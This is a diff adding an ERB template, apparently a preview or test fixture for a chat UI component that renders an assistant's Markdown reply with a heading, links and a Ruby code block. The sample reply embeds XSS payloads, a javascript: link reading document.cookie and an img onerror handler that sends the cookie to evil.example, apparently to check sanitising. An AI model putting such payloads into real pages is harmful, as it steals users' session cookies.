@@ -1,0 +1,20 @@
+<%# The poetry arm: "an assistant's reply written in Markdown, shown in a
+    transcript: its heading, a link out, a block of code, and text in the
+    reply that is markup". %>
+<% reply = <<~MARKDOWN
+  # Late orders
+
+  Two orders are **late**. See [the guide](https://example.com/fulfilment) or [open the report](javascript:alert(document.cookie)).
+
+  <img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">
+
+  ```ruby
+  Order.processing.where(due_on: ...Date.current)
+  ```
+MARKDOWN
+%>
+<%= poetry_message do %>
+  <%= poetry_bubble(variant: :ghost) do %>
+    <%= poetry_markdown(text: reply, heading_level: 3) %>
+  <% end %>
+<% end %>
